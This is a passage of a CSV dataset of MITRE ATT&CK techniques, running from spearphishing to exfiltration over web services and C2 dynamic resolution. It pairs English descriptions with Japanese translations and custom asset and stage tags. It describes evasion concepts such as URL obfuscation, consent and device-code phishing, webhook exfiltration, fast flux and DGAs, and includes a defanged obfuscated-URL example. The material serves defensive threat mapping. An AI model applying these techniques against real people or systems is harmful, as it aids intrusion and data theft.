このシナリオでは、攻撃者はスピアフィッシングメールにファイルを添付し、通常は[ユーザー実行](https://attack.mitre.org/techniques/T1204)に依存して実行権限を獲得します。（引用元：Unit 42 DarkHydrus 2018年7月）スピアフィッシングには、信頼できる送信者を装うなどのソーシャルエンジニアリング手法も含まれる場合があります。 添付ファイルには、Microsoft Office文書、実行可能ファイル、PDF、アーカイブファイルなど様々な形式が用いられます。添付ファイルを開く（場合によっては保護機能を回避してクリックする）と、攻撃者のペイロードが脆弱性を悪用するか、ユーザーのシステム上で直接実行されます。標的型フィッシングメールの本文は通常、ファイルを開くべき妥当な理由を示し、システム保護を迂回する方法を説明することがあります。 メールには、メール境界防御を回避するために、zipファイルのパスワードなど、添付ファイルの復号方法に関する指示が含まれている場合もあります。攻撃者は、添付された実行ファイルを文書ファイルに見せかけたり、あるアプリケーションを悪用するファイルを別のアプリケーション用のファイルに見せかけたりするために、ファイル拡張子やアイコンを頻繁に操作します。,initial-access,macOS;Windows;Linux,credential_abuse,entry,authentication_system;user_interaction;endpoint_execution;email_infrastructure;file_storage_access,specified,Business Workstation;Mail / Collaboration;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S1,S1,C01,Initial Access,C01,Initial Access,TA0001,attack-pattern--2e34237d-8574-43f6-aace-ae2915de8597,2020-03-02T19:05:18.137Z,2025-04-15T23:10:26.686Z,,,,
T1566.002,T1566,Spearphishing Link,スピアフィッシングリンク,"Adversaries may send spearphishing emails with a malicious link in an attempt to gain access to victim systems. Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. Spearphishing may also involve social engineering techniques, such as posing as a trusted source. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging [User Execution](https://attack.mitre.org/techniques/T1204). The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place. Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly. Additionally, adversaries may use seemingly benign links that abuse special characters to mimic legitimate websites (known as an ""IDN homograph attack"").(Citation: CISA IDN ST05-016) URLs may also be obfuscated by taking advantage of quirks in the URL schema, such as the acceptance of integer- or hexadecimal-based hostname formats and the automatic discarding of text before an “@ Esymbol: for example, `hxxp://google.com@1157586937`.(Citation: Mandiant URL Obfuscation 2023) Adversaries may also utilize links to perform consent phishing, typically with OAuth 2.0 request URLs that when accepted by the user provide permissions/access for malicious applications, allowing adversaries to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s.(Citation: Trend Micro Pawn Storm OAuth 2017) These stolen access tokens allow the adversary to perform various actions on behalf of the user via API calls. (Citation: Microsoft OAuth 2.0 Consent Phishing 2021) Adversaries may also utilize spearphishing links to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s that grant immediate access to the victim environment. For example, a user may be lured through “consent phishing Einto granting adversaries permissions/access via a malicious OAuth 2.0 request URL .(Citation: Trend Micro Pawn Storm OAuth 2017)(Citation: Microsoft OAuth 2.0 Consent Phishing 2021) Similarly, malicious links may also target device-based authorization, such as OAuth 2.0 device authorization grant flow which is typically used to authenticate devices without UIs/browsers. Known as “device code phishing, Ean adversary may send a link that directs the victim to a malicious authorization page where the user is tricked into entering a code/credentials that produces a device token.(Citation: SecureWorks Device Code Phishing 2021)(Citation: Netskope Device Code Phishing 2021)(Citation: Optiv Device Code Phishing 2021)",攻撃者は被害者システムへのアクセスを得るため、悪意のあるリンクを含むスピアフィッシングメールを送信することがあります。リンク付きスピアフィッシングはスピアフィッシングの特定の手法であり、メール本体に悪意のあるファイルを添付するのではなく、メール内のリンクを利用してマルウェアをダウンロードさせる点で、メール添付ファイルを検査する防御を回避する他のスピアフィッシング手法とは異なります。 スピアフィッシングには、信頼できる送信者を装うなどのソーシャルエンジニアリング手法が用いられる場合もある。 あらゆる形態のスピアフィッシングは、特定の個人・企業・業界を標的とした電子的なソーシャルエンジニアリング攻撃である。この場合、悪意のあるメールにはリンクが含まれる。通常、リンクにはソーシャルエンジニアリング文言が添えられ、ユーザーが[ユーザー実行](https://attack.mitre.org/techniques/T1204)を利用してURLを積極的にクリック、またはブラウザにコピー＆ペーストするよう要求する。 訪問されたウェブサイトはエクスプロイトを用いてウェブブラウザを侵害する可能性があり、あるいはメールの口実に応じて、ユーザーはアプリケーション、文書、zipファイル、さらには実行ファイルのダウンロードを促される場合があります。 攻撃者は、メールリーダーと直接連携するリンク（エンドシステムを直接攻撃する埋め込み画像を含む）を挿入する場合もあります。さらに、特殊文字を悪用して正規サイトを模倣する一見無害なリンク（「IDNホモグラフ攻撃」として知られる手法）を使用する可能性もあります。(引用元: CISA IDN ST05-016) URLは、整数または16進数ベースのホスト名形式の受け入れや「@」記号前のテキストの自動削除といったURLスキーマの特性を悪用して難読化される場合もある。例: `hxxp://google.com@1157586937`。(引用元: Mandiant URL Obfuscation 2023) 攻撃者はリンクを利用して同意フィッシングを実行することもあり、典型的にはOAuth 2.0リクエストURLを用いる。ユーザーがこれを承認すると、悪意のあるアプリケーションに権限/アクセスが提供され、攻撃者が[アプリケーションアクセストークンを窃取](https://attack.mitre.org/techniques/T1528)できるようになる。(引用元: Trend Micro Pawn Storm OAuth 2017) こうした盗まれたアクセストークンにより、攻撃者はAPI呼び出しを通じてユーザーに代わって様々な操作を実行できます。 (引用元: Microsoft OAuth 2.0 Consent Phishing 2021) 攻撃者は、被害者の環境に即座にアクセスできる [アプリケーションアクセストークン](https://attack.mitre.org/techniques/T1528) を盗むために、スピアフィッシングリンクを利用することもあります。 例えば、ユーザーは「同意フィッシング」によって悪意のあるOAuth 2.0リクエストURLを介して攻撃者に権限/アクセスを許可するよう誘導される可能性があります。(引用: Trend Micro Pawn Storm OAuth 2017)(引用: Microsoft OAuth 2.0 Consent Phishing 2021) 同様に、悪意のあるリンクはデバイスベースの認証（例：UI/ブラウザなしのデバイス認証に用いられるOAuth 2.0デバイス認証グラントフロー）も標的とする。「デバイスコードフィッシング」として知られる手法では、攻撃者が被害者を悪意のある認証ページへ誘導するリンクを送信し、ユーザーを騙してデバイストークンを生成するコード/認証情報を入力させる。(引用元: SecureWorks Device Code Phishing 2021)(引用元: Netskope Device Code Phishing 2021)(引用元: Optiv Device Code Phishing 2021),initial-access,Linux;macOS;Windows;SaaS;Identity Provider;Office Suite,credential_abuse,entry,authentication_system;identity_federation;user_interaction;endpoint_execution;email_infrastructure;cloud_control_plane;file_storage_access,specified,Business Workstation;Identity / SaaS (IdP/SSO);Mail / Collaboration;Management Console for GovCloud;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S1,S1,C01,Initial Access,C01,Initial Access,TA0001,attack-pattern--2b742742-28c3-4e1b-bab7-8350d6300fa7,2020-03-02T19:15:44.182Z,2025-04-15T23:10:41.326Z,,,,
T1566.003,T1566,Spearphishing via Service,サービス経由のスピアフィッシング,"Adversaries may send spearphishing messages via third-party services in an attempt to gain access to victim systems. Spearphishing via service is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of third party services rather than directly via enterprise email channels. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services.(Citation: Lookout Dark Caracal Jan 2018) These services are more likely to have a less-strict security policy than an enterprise. As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target's interest in some way. Adversaries will create fake social media accounts and message employees for potential job opportunities. Doing so allows a plausible reason for asking about services, policies, and software that's running in an environment. The adversary can then send malicious links or attachments through these services. A common example is to build rapport with a target via social media, then send content to a personal webmail service that the target uses on their work computer. This allows an adversary to bypass some email restrictions on the work account, and the target is more likely to open the file since it's something they were expecting. If the payload doesn't work as expected, the adversary can continue normal communications and troubleshoot with the target on how to get it working.",攻撃者は、被害者システムへのアクセスを得るため、サードパーティサービス経由でスピアフィッシングメッセージを送信することがある。サービス経由のスピアフィッシングは、スピアフィッシングの特定亜種である。企業メールチャネルを直接利用せずサードパーティサービスを利用する点で、他の形態のスピアフィッシングとは異なる。あらゆる形態のスピアフィッシングは、特定の個人・企業・業界を標的とした電子的に配信されるソーシャルエンジニアリングである。 このシナリオでは、攻撃者は各種ソーシャルメディアサービス、個人用ウェブメール、その他企業管理外のサービスを通じてメッセージを送信する（出典：Lookout Dark Caracal 2018年1月）。これらのサービスは企業よりもセキュリティポリシーが緩い傾向にある。大半のスピアフィッシングと同様、目的は標的との信頼関係を構築するか、何らかの形で標的の関心を引くことである。 攻撃者は偽のソーシャルメディアアカウントを作成し、従業員に潜在的な就職機会についてメッセージを送ります。これにより、環境内で稼働しているサービス、ポリシー、ソフトウェアについて尋ねる妥当な理由が生まれます。攻撃者はその後、これらのサービスを通じて悪意のあるリンクや添付ファイルを送信できます。 典型的な手法として、ソーシャルメディアで標的との信頼関係を構築した後、標的が業務用PCで使用する個人用ウェブメールサービスにコンテンツを送信する例が挙げられる。これにより攻撃者は業務用アカウントのメール制限を回避でき、標的は期待していた内容であるためファイルを開く可能性が高まる。ペイロードが想定通りに動作しない場合、攻撃者は通常のコミュニケーションを継続し、動作させる方法について標的とトラブルシューティングを行うことができる。,initial-access,Linux;macOS;Windows,config_policy_manipulation,entry,user_interaction;email_infrastructure;cloud_control_plane;file_storage_access,specified,Business Workstation;Mail / Collaboration;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S1,S1,C01,Initial Access,C01,Initial Access,TA0001,attack-pattern--f6ad61ee-65f3-4bd0-a3f5-2f0accb36317,2020-03-02T19:24:00.951Z,2025-04-15T23:11:50.622Z,,,,
T1566.004,T1566,Spearphishing Voice,スピアフィッシング音声,"Adversaries may use voice communications to ultimately gain access to victim systems. Spearphishing voice is a specific variant of spearphishing. It is different from other forms of spearphishing in that is employs the use of manipulating a user into providing access to systems through a phone call or other forms of voice communications. Spearphishing frequently involves social engineering techniques, such as posing as a trusted source (ex: [Impersonation](https://attack.mitre.org/techniques/T1656)) and/or creating a sense of urgency or alarm for the recipient. All forms of phishing are electronically delivered social engineering. In this scenario, adversaries are not directly sending malware to a victim vice relying on [User Execution](https://attack.mitre.org/techniques/T1204) for delivery and execution. For example, victims may receive phishing messages that instruct them to call a phone number where they are directed to visit a malicious URL, download malware,(Citation: sygnia Luna Month)(Citation: CISA Remote Monitoring and Management Software) or install adversary-accessible remote management tools ([Remote Access Tools](https://attack.mitre.org/techniques/T1219)) onto their computer.(Citation: Unit42 Luna Moth) Adversaries may also combine voice phishing with [Multi-Factor Authentication Request Generation](https://attack.mitre.org/techniques/T1621) in order to trick users into divulging MFA credentials or accepting authentication prompts.(Citation: Proofpoint Vishing)",攻撃者は音声通信を利用して最終的に被害者システムへのアクセス権を獲得する場合がある。スピアフィッシング音声はスピアフィッシングの特定亜種であり、電話やその他の音声通信手段を通じてユーザーを操作しシステムへのアクセス権を提供させる点で他の形態と異なる。 スピアフィッシングでは、信頼できる情報源を装う（例：[なりすまし](https://attack.mitre.org/techniques/T1656)）や、受信者に緊急性や警戒心を抱かせるといったソーシャルエンジニアリング手法が頻繁に用いられる。 あらゆる形態のフィッシングは、電子的に配信されるソーシャルエンジニアリングである。このシナリオでは、攻撃者はマルウェアを直接被害者に送信せず、配信と実行を[ユーザー実行](https://attack.mitre.org/techniques/T1204)に依存する。 例えば、被害者はフィッシングメッセージを受け取り、指定された電話番号に電話するよう指示される場合があります。電話すると、悪意のあるURLへのアクセス、マルウェアのダウンロード（引用元：sygnia Luna Month）（引用元：CISA Remote Monitoring and Management Software）、または攻撃者がアクセス可能なリモート管理ツール（[Remote Access Tools](https://attack.mitre.org/techniques/T1219)）のインストールを促されます。(引用元: Unit42 Luna Moth) 攻撃者はまた、音声フィッシングと[多要素認証要求生成](https://attack.mitre.org/techniques/T1621)を組み合わせて、ユーザーを騙してMFA認証情報を漏洩させたり、認証プロンプトを受け入れさせたりすることもある。(引用元: Proofpoint Vishing),initial-access,Linux;macOS;Windows;Identity Provider,credential_abuse,entry,authentication_system;mfa_in_use;user_interaction;endpoint_execution;network_connectivity;logging_monitoring,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S1,S1,C01,Initial Access,C01,Initial Access,TA0001,attack-pattern--bb5e59c4-abe7-40c7-8196-e373cb1e5974,2023-09-07T21:50:08.827Z,2025-04-15T19:59:02.243Z,,,,
T1567,,Exfiltration Over Web Service,Webサービス経由のデータ流出,"Adversaries may use an existing, legitimate external Web service to exfiltrate data rather than their primary command and control channel. Popular Web services acting as an exfiltration mechanism may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to compromise. Firewall rules may also already exist to permit traffic to these services. Web service providers also commonly use SSL/TLS encryption, giving adversaries an added level of protection.",攻撃者は、主要なコマンドアンドコントロールチャネルではなく、既存の正当な外部Webサービスを利用してデータを流出させる場合があります。流出メカニズムとして機能する一般的なWebサービスは、ネットワーク内のホストが侵害前に既にそれらと通信している可能性が高いため、かなりの隠蔽効果をもたらす可能性があります。また、これらのサービスへのトラフィックを許可するファイアウォールルールが既に存在している場合もあります。WebサービスプロバイダーはSSL/TLS暗号化を一般的に使用しており、攻撃者に追加の保護層を提供します。,exfiltration,Linux;Office Suite;SaaS;Windows;macOS;ESXi,script_command_execution,data_outflow,endpoint_execution;network_connectivity,specified,Business Workstation;File Server;Identity / SaaS (IdP/SSO);Management Console for GovCloud;My Number Administrative System on GovCloud;Server (On-Prem/VM),has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0010,attack-pattern--40597f16-0963-4249-bf4c-ac93b7fb9807,2020-03-09T12:51:45.570Z,2025-04-15T19:58:25.560Z,,,,
T1567.001,T1567,Exfiltration to Code Repository,コードリポジトリへのデータ流出,"Adversaries may exfiltrate data to a code repository rather than over their primary command and control channel. Code repositories are often accessible via an API (ex: https://api.github.com). Access to these APIs are often over HTTPS, which gives the adversary an additional level of protection. Exfiltration to a code repository can also provide a significant amount of cover to the adversary if it is a popular service already used by hosts within the network.",攻撃者は、主要なコマンド＆コントロールチャネルではなくコードリポジトリへデータを流出させる場合がある。コードリポジトリはAPI経由でアクセス可能なことが多い（例：https://api.github.com）。 これらのAPIへのアクセスはHTTPS経由であることが多く、攻撃者にさらなる保護層を提供します。コードリポジトリへの流出は、ネットワーク内のホストが既に利用している一般的なサービスである場合、攻撃者に相当な隠れ蓑を提供することもあります。,exfiltration,Linux;macOS;Windows;ESXi,script_command_execution,data_outflow,endpoint_execution;network_connectivity;cloud_control_plane,specified,Business Workstation;File Server;My Number Administrative System on GovCloud;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0010,attack-pattern--86a96bf6-cf8b-411c-aaeb-8959944d64f7,2020-03-09T14:51:11.772Z,2025-04-15T19:58:48.876Z,,,,
T1567.002,T1567,Exfiltration to Cloud Storage,クラウドストレージへのデータ流出,"Adversaries may exfiltrate data to a cloud storage service rather than over their primary command and control channel. Cloud storage services allow for the storage, edit, and retrieval of data from a remote cloud storage server over the Internet. Examples of cloud storage services include Dropbox and Google Docs. Exfiltration to these cloud storage services can provide a significant amount of cover to the adversary if hosts within the network are already communicating with the service.",攻撃者は、主要なコマンド＆コントロールチャネルではなくクラウドストレージサービスへデータを流出させる場合があります。クラウドストレージサービスは、インターネット経由で遠隔クラウドストレージサーバーからのデータの保存、編集、取得を可能にします。例としてDropboxやGoogle Docsが挙げられます。ネットワーク内のホストが既に当該サービスと通信している場合、これらのクラウドストレージサービスへの流出は攻撃者に大きな隠れ蓑を提供します。,exfiltration,Linux;macOS;Windows;ESXi,script_command_execution,data_outflow,endpoint_execution;network_connectivity;cloud_control_plane;file_storage_access,specified,Business Workstation;File Server;My Number Administrative System on GovCloud;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0010,attack-pattern--bf1b6176-597c-4600-bfcd-ac989670f96b,2020-03-09T15:04:32.767Z,2025-04-15T19:59:03.751Z,,,,
T1567.003,T1567,Exfiltration to Text Storage Sites,テキストストレージサイトへの流出,"Adversaries may exfiltrate data to text storage sites instead of their primary command and control channel. Text storage sites, such as <code>pastebin[.]com</code>, are commonly used by developers to share code and other information. Text storage sites are often used to host malicious code for C2 communication (e.g., [Stage Capabilities](https://attack.mitre.org/techniques/T1608)), but adversaries may also use these sites to exfiltrate collected data. Furthermore, paid features and encryption options may allow adversaries to conceal and store data more securely.(Citation: Pastebin EchoSec) **Note:** This is distinct from [Exfiltration to Code Repository](https://attack.mitre.org/techniques/T1567/001), which highlight access to code repositories via APIs.",攻撃者は、主要なコマンドアンドコントロールチャネルではなくテキストストレージサイトへデータを流出させる可能性がある。<code>pastebin[.]com</code>などのテキストストレージサイトは、開発者がコードやその他の情報を共有するために一般的に使用される。 テキストストレージサイトは、C2通信用の悪意のあるコードをホストするためによく使用されます（例：[Stage Capabilities](https://attack.mitre.org/techniques/T1608)）。しかし、攻撃者は収集したデータを流出させるためにもこれらのサイトを利用することがあります。 さらに、有料機能や暗号化オプションにより、攻撃者はデータをより安全に隠蔽・保存できる可能性がある。(引用元: Pastebin EchoSec)**注:** これは、API経由でのコードリポジトリへのアクセスを強調する[コードリポジトリへの流出](https://attack.mitre.org/techniques/T1567/001)とは異なる。,exfiltration,Linux;macOS;Windows;ESXi,script_command_execution,data_outflow,endpoint_execution;cloud_control_plane;file_storage_access,specified,Business Workstation;File Server;My Number Administrative System on GovCloud;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0010,attack-pattern--ba04e672-da86-4e69-aa15-0eca5db25f43,2023-02-27T22:51:27.101Z,2025-04-15T19:59:01.716Z,,,,
T1567.004,T1567,Exfiltration Over Webhook,Webhook経由のデータ流出,"Adversaries may exfiltrate data to a webhook endpoint rather than over their primary command and control channel. Webhooks are simple mechanisms for allowing a server to push data over HTTP/S to a client without the need for the client to continuously poll the server.(Citation: RedHat Webhooks) Many public and commercial services, such as Discord, Slack, and `webhook.site`, support the creation of webhook endpoints that can be used by other services, such as Github, Jira, or Trello.(Citation: Discord Intro to Webhooks) When changes happen in the linked services (such as pushing a repository update or modifying a ticket), these services will automatically post the data to the webhook endpoint for use by the consuming application. Adversaries may link an adversary-owned environment to a victim-owned SaaS service to achieve repeated [Automated Exfiltration](https://attack.mitre.org/techniques/T1020) of emails, chat messages, and other data.(Citation: Push Security SaaS Attacks Repository Webhooks) Alternatively, instead of linking the webhook endpoint to a service, an adversary can manually post staged data directly to the URL in order to exfiltrate it.(Citation: Microsoft SQL Server) Access to webhook endpoints is often over HTTPS, which gives the adversary an additional level of protection. Exfiltration leveraging webhooks can also blend in with normal network traffic if the webhook endpoint points to a commonly used SaaS application or collaboration service.(Citation: CyberArk Labs Discord)(Citation: Talos Discord Webhook Abuse)(Citation: Checkmarx Webhooks)",攻撃者は、主要なコマンド＆コントロールチャネルではなく、Webhookエンドポイントにデータを流出させる可能性がある。 Webhookは、クライアントがサーバーを継続的にポーリングする必要なく、サーバーがHTTP/S経由でクライアントにデータをプッシュすることを可能にするシンプルな仕組みです。(出典: RedHat Webhooks) Discord、Slack、`webhook.site`など多くの公共・商用サービスは、Github、Jira、Trelloなどの他サービスが利用可能なWebhookエンドポイントの作成をサポートしています。(引用元: Discord Intro to Webhooks) 連携サービスで変更が発生した場合（リポジトリ更新のプッシュやチケットの修正など）、これらのサービスは自動的にデータをWebhookエンドポイントに投稿し、消費アプリケーションが利用できるようにします。 攻撃者は、悪意のある環境を被害者が所有するSaaSサービスにリンクさせることで、メールやチャットメッセージなどのデータを繰り返し[自動化された情報漏洩](https://attack.mitre.org/techniques/T1020)させる可能性があります。(引用元: Push Security SaaS Attacks Repository Webhooks) あるいは、Webhookエンドポイントをサービスにリンクさせる代わりに、攻撃者が手動で準備済みのデータを直接URLに投稿して流出させることも可能です。(引用元: Microsoft SQL Server) WebhookエンドポイントへのアクセスはHTTPS経由であることが多く、攻撃者に追加の保護層を提供します。 ウェブフックを悪用したデータ流出は、ウェブフックエンドポイントが一般的なSaaSアプリケーションやコラボレーションサービスを指している場合、通常のネットワークトラフィックに紛れ込むことも可能です。(引用: CyberArk Labs Discord)(引用: Talos Discord Webhook Abuse)(引用: Checkmarx Webhooks),exfiltration,Windows;macOS;Linux;SaaS;Office Suite;ESXi,script_command_execution,data_outflow,mfa_in_use;user_interaction;endpoint_execution;network_connectivity;email_infrastructure;saas_in_use;database_access,specified,Business Workstation;File Server;Identity / SaaS (IdP/SSO);Mail / Collaboration;Management Console for GovCloud;My Number Administrative System on GovCloud;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0010,attack-pattern--43f2776f-b4bd-4118-94b8-fee47e69676d,2023-07-20T15:30:55.763Z,2025-04-15T19:58:26.901Z,,,,
T1568,,Dynamic Resolution,動的解決,"Adversaries may dynamically establish connections to command and control infrastructure to evade common detections and remediations. This may be achieved by using malware that shares a common algorithm with the infrastructure the adversary uses to receive the malware's communications. These calculations can be used to dynamically adjust parameters such as the domain name, IP address, or port number the malware uses for command and control. Adversaries may use dynamic resolution for the purpose of [Fallback Channels](https://attack.mitre.org/techniques/T1008). When contact is lost with the primary command and control server malware may employ dynamic resolution as a means to reestablishing command and control.(Citation: Talos CCleanup 2017)(Citation: FireEye POSHSPY April 2017)(Citation: ESET Sednit 2017 Activity)",攻撃者は、一般的な検知や対策回避のため、コマンド＆コントロール（C&C）インフラへの接続を動的に確立することがあります。これは、攻撃者がマルウェア通信を受信するために使用するインフラと共通のアルゴリズムを共有するマルウェアを使用することで実現されます。これらの計算は、マルウェアがC&Cに使用するドメイン名、IPアドレス、ポート番号などのパラメータを動的に調整するために利用されます。 攻撃者は、[フォールバックチャネル](https://attack.mitre.org/techniques/T1008)の目的で動的解決を使用する場合がある。 プライマリC&Cサーバーとの接続が失われた場合、マルウェアはC&C再確立手段として動的解決を採用することがある。（引用元：Talos CCleanup 2017）（引用元：FireEye POSHSPY 2017年4月）（引用元：ESET Sednit 2017年活動）,command-and-control,Linux;macOS;Windows;ESXi,script_command_execution,remote_control,endpoint_execution;file_storage_access,specified,Business Workstation;File Server;Server (On-Prem/VM),has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0011,attack-pattern--7bd9c723-2f78-4309-82c5-47cad406572b,2020-03-10T17:28:11.747Z,2025-04-25T15:15:46.359Z,,,,
T1568.001,T1568,Fast Flux DNS,Fast Flux DNS,"Adversaries may use Fast Flux DNS to hide a command and control channel behind an array of rapidly changing IP addresses linked to a single domain resolution. This technique uses a fully qualified domain name, with multiple IP addresses assigned to it which are swapped with high frequency, using a combination of round robin IP addressing and short Time-To-Live (TTL) for a DNS resource record.(Citation: MehtaFastFluxPt1)(Citation: MehtaFastFluxPt2)(Citation: Fast Flux - Welivesecurity) The simplest, ""single-flux"" method, involves registering and de-registering an addresses as part of the DNS A (address) record list for a single DNS name. These registrations have a five-minute average lifespan, resulting in a constant shuffle of IP address resolution.(Citation: Fast Flux - Welivesecurity) In contrast, the ""double-flux"" method registers and de-registers an address as part of the DNS Name Server record list for the DNS zone, providing additional resilience for the connection. With double-flux additional hosts can act as a proxy to the C2 host, further insulating the true source of the C2 channel.",攻撃者は、単一ドメイン解決にリンクされた急速に変化するIPアドレス群の背後でコマンド＆コントロールチャネルを隠蔽するため、ファストフラックスDNSを利用することがある。この手法では、完全修飾ドメイン名（FQDN）に複数のIPアドレスを割り当て、ラウンドロビン方式のIPアドレス割り当てとDNSリソースレコードの短い生存時間（TTL）を組み合わせて、高頻度でアドレスを切り替える。（引用元：MehtaFastFluxPt1）(引用: MehtaFastFluxPt2)(引用: Fast Flux - Welivesecurity) 最も単純な「シングルフラックス」手法では、単一のDNS名に対するDNS Aレコード（アドレスレコード）リストの一部としてアドレスを登録・解除する。これらの登録の平均有効期間は5分であり、IPアドレス解決が絶えず入れ替わる結果となる。(引用元: Fast Flux - Welivesecurity) これに対し「ダブルフラックス」方式では、DNSゾーンのネームサーバーレコードリスト内でアドレスの登録・解除を行い、接続の耐障害性を強化します。ダブルフラックスでは追加のホストがC2ホストへのプロキシとして機能し、C2チャネルの真の出所をさらに隠蔽します。,command-and-control,Linux;macOS;Windows;ESXi,script_command_execution,remote_control,user_interaction;endpoint_execution;network_connectivity;cloud_control_plane,specified,Business Workstation;Proxy / Gateway;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0011,attack-pattern--29ba5a15-3b7b-4732-b817-65ea8f6468e6,2020-03-11T14:11:16.560Z,2025-04-25T14:46:09.378Z,,,,
T1568.002,T1568,Domain Generation Algorithms,ドメイン生成アルゴリズム,"Adversaries may make use of Domain Generation Algorithms (DGAs) to dynamically identify a destination domain for command and control traffic rather than relying on a list of static IP addresses or domains. This has the advantage of making it much harder for defenders to block, track, or take over the command and control channel, as there potentially could be thousands of domains that malware can check for instructions.(Citation: Cybereason Dissecting DGAs)(Citation: Cisco Umbrella DGA)(Citation: Unit 42 DGA Feb 2019) DGAs can take the form of apparently random or “gibberish Estrings (ex: istgmxdejdnxuyla.ru) when they construct domain names by generating each letter. Alternatively, some DGAs employ whole words as the unit by concatenating words together instead of letters (ex: cityjulydish.net). Many DGAs are time-based, generating a different domain for each time period (hourly, daily, monthly, etc). Others incorporate a seed value as well to make predicting future domains more difficult for defenders.(Citation: Cybereason Dissecting DGAs)(Citation: Cisco Umbrella DGA)(Citation: Talos CCleanup 2017)(Citation: Akamai DGA Mitigation) Adversaries may use DGAs for the purpose of [Fallback Channels](https://attack.mitre.org/techniques/T1008). When contact is lost with the primary command and control server malware may employ a DGA as a means to reestablishing command and control.(Citation: Talos CCleanup 2017)(Citation: FireEye POSHSPY April 2017)(Citation: ESET Sednit 2017 Activity)",攻撃者は、静的なIPアドレスやドメインのリストに依存する代わりに、ドメイン生成アルゴリズム（DGA）を利用してコマンド＆コントロール通信の宛先ドメインを動的に特定することがあります。これにより、防御側がコマンド＆コントロールチャネルを遮断、追跡、または乗っ取るのが非常に困難になります。マルウェアが指示を確認できるドメインが数千にも及ぶ可能性があるためです。(引用: Cybereason Dissecting DGAs)(引用: Cisco Umbrella DGA)(引用: Unit 42 DGA Feb 2019) DGAは、各文字を生成してドメイン名を構築する場合、一見ランダムな「意味不明な文字列」（例: istgmxdejdnxuyla.ru）の形をとる。 あるいは、文字ではなく単語を連結して単位とするDGAも存在する（例：cityjulydish.net）。多くのDGAは時間ベースで、時間単位（毎時、毎日、毎月など）ごとに異なるドメインを生成する。さらにシード値を組み込むことで、防御側による将来のドメイン予測を困難にするものもある。（引用元：Cybereason Dissecting DGAs）（引用元：Cisco Umbrella DGA）（引用元：Talos CCleanup 2017）（引用元：Akamai DGA Mitigation）攻撃者は[フォールバックチャネル](https://attack.mitre.org/techniques/T1008)の目的でDGAを利用する場合がある。 プライマリC&Cサーバーとの接続が失われた場合、マルウェアはC&C再確立手段としてDGAを運用することがある。(引用: Talos CCleanup 2017)(引用: FireEye POSHSPY 2017年4月)(引用: ESET Sednit 2017年活動),command-and-control,Linux;macOS;Windows;ESXi,script_command_execution,remote_control,endpoint_execution,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0011,attack-pattern--118f61a5-eb3e-4fb6-931f-2096647f4ecd,2020-03-10T17:44:59.787Z,2025-04-15T19:58:07.610Z,,,,
T1568.003,T1568,DNS Calculation,DNS計算,"Adversaries may perform calculations on addresses returned in DNS results to determine which port and IP address to use for command and control, rather than relying on a predetermined port number or the actual returned IP address. A IP and/or port number calculation can be used to bypass egress filtering on a C2 channel.(Citation: Meyers Numbered Panda) One implementation of [DNS Calculation](https://attack.mitre.org/techniques/T1568/003) is to take the first three octets of an IP address in a DNS response and use those values to calculate the port for command and control traffic.(Citation: Meyers Numbered Panda)(Citation: Moran 2014)(Citation: Rapid7G20Espionage)",攻撃者は、事前に決められたポート番号や実際に返されたIPアドレスに依存せず、DNS結果で返されたアドレスに対して計算を行い、コマンドアンドコントロールに使用するポートとIPアドレスを決定することがあります。IPアドレスおよび/またはポート番号の計算は、C2チャネルの出口フィルタリングを回避するために使用される可能性があります。（引用元：Meyers Numbered Panda） [DNS計算](https://attack.mitre.org/techniques/T1568/003)の一つの実装例は、DNS応答内のIPアドレスの最初の3オクテットを取得し、それらの値を用いてコマンドアンドコントロール通信用のポートを計算することである。(引用元: Meyers Numbered Panda)(引用元: Moran 2014)(引用元: Rapid7G20Espionage),command-and-control,Linux;macOS;Windows;ESXi,script_command_execution,remote_control,endpoint_execution;cloud_control_plane,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0011,attack-pattern--83a766f8-1501-4b3a-a2de-2e2849e8dfc1,2020-03-11T14:56:34.154Z,2025-04-25T14:47:18.343Z,,,,
